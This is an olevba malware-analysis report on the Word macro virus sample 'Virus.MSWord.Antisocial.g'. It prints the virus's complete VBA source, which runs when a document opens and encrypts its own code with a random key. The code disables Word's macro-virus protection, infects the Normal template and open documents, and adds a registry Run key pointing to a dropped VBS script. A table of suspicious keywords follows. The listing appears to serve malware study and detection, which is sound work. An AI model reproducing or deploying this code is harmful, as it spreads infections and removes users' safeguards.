olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Antisocial.g
Type: Text
-------------------------------------------------------------------------------
VBA MACRO ./Virus.MSWord.Antisocial.g 
in file: ./Virus.MSWord.Antisocial.g - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Application.EnableCancelKey = wdCancelDisabled
For A = 1 To ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(A, 1) = "Private Sub ViewVBCode()" Then
B = A
GoTo GotIt
End If
Next A
GotIt:
For C = B + 1 To ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines - 1
d = ""
I = (ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(C, 1))
f = (Mid(I, 2, 1))
For x = 3 To Len(I)
E = Asc(Mid(I, x, 1)) - f
d = d & Chr(E)
Next x
G = d
ThisDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine C, G
Next C
Call ViewVBCode
End Sub
Private Sub ViewVBCode()
If ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines > 120 Then
For x = 1 To ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
E = Mid(ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(x, 1), 1, 1)
If E = "'" Then ThisDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines x, 1
Next x
End If
For A = 1 To ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(A, 1) = "Private Sub ViewVBCode()" Then
B = A
GoTo GotIt
End If
Next A
GotIt:
For C = B + 1 To ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines - 1
d = ""
I = (ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(C, 1))
f = Int(Rnd() * 8) + 1
For x = 1 To Len(I)
E = Asc(Mid(I, x, 1)) + f
d = d & Chr(E)
Next x
G = d
ThisDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine C, "'" & f & G
Next C
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
Options.ConfirmConversions = 0
For Grow = 1 To 20
Number = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
RandomLine = Int(Rnd() * Number + 1)
RemarkLength = Int(Rnd() * 99 + 1)
For Length = 1 To RemarkLength
Remark = Remark + Chr$(Int((90 - 65 + 1) * Rnd + 65))
Next Length
ThisDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines RandomLine, "'0'" & Remark
Remark = ""
Next Grow
Set TD = ThisDocument.VBProject.VBComponents.Item(1).CodeModule
Set AD = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
Set NT = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
CM = TD.Lines(1, TD.CountOfLines)
NT.DeleteLines 1, NT.CountOfLines
NT.AddFromString CM
AD.DeleteLines 1, AD.CountOfLines
AD.AddFromString CM
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Lys Kovick") <> "Nachfolgerin" Then
FN = Int(Rnd() * 9998 + 1)
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Nachfolgerin") = "C:\" & FN & ".VBS"
Open "C:\" & FN & ".VBS" For Output As #1
Print #1, "Set N = WScript.CreateObject(" & Chr(34) & "Word.Application" & Chr(34) & ")"
Print #1, "N.Options.VirusProtection = 0: N.Options.SaveNormalPrompt = 0: N.Options.ConfirmConversions = 0"
Print #1, "For x = 1 To N.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
Print #1, "N.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1": Print #1, "Next"
Print #1, "N.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile (" & Chr(34) & "C:\" & FN & ".SYS" & Chr(34) & ")"
Print #1, "N.Application.Quit": Close #1
Open "C:\" & FN & ".SYS" For Output As #1
Print #1, CM: Close #1
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Lys Kovick") = "Nachfolgerin"
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

